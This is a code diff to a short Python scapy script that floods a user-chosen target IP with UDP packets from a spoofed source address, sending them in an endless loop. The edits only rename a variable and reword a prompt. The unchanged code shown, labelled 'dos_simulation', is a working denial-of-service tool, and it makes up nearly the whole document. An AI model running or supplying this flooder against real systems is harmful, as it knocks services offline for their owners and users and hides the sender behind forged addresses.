@@ -2,7 +2,8 @@ import scapy.all as scp
 
 ip_src = input("Fake Source IP (blank for your IP): ")
 ip_dst = input("Target IP: ")
-pkg_size = input("Package Size (blank for max): ")
+
+pkg_size = input("packet Size (blank for max): ")
 
 
 def dos_simulation(ip_src, ip_dst, pkg_size):
@@ -16,10 +17,10 @@ def dos_simulation(ip_src, ip_dst, pkg_size):
     udp_layer = scp.UDP(sport=80, dport=21)
     raw_layer = scp.Raw(int(pkg_size))
 
-    package = ip_layer / udp_layer / raw_layer
+    packet = ip_layer / udp_layer / raw_layer
 
-    scp.send(package, loop=1)
-    print(package)
+    scp.send(packet, loop=1)
+    print(packet)
 
 
 dos_simulation(ip_src, ip_dst, pkg_size)
